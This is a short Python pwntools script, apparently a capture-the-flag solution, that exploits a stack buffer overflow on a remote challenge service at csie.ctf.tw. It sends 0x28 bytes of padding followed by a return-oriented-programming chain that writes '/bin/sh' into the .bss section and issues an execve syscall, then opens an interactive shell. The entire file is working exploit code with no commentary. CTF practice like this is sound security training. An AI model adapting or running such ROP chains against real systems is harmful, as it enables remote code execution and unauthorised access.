#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10130)

binsh = '/bin/sh\x00'
bss_addr = p64(0x6cb500)

pop_rax_rdx_rbx_gadget = p64(0x478516)
pop_rdx_gadget = p64(0x4427e6)
pop_rsi_gadget = p64(0x401577)
pop_rdi_gadget = p64(0x401456)
mov_ptr_rdi_from_rdx_gadget = p64(0x4353e3)
syscall_gadget = p64(0x4671b5)

payload = 'A'*0x28 + pop_rdi_gadget + bss_addr + pop_rdx_gadget + binsh + mov_ptr_rdi_from_rdx_gadget + pop_rsi_gadget + p64(0) + pop_rax_rdx_rbx_gadget + p64(0x3b) + p64(0) + p64(0) + syscall_gadget
r.sendline(payload)

r.interactive()
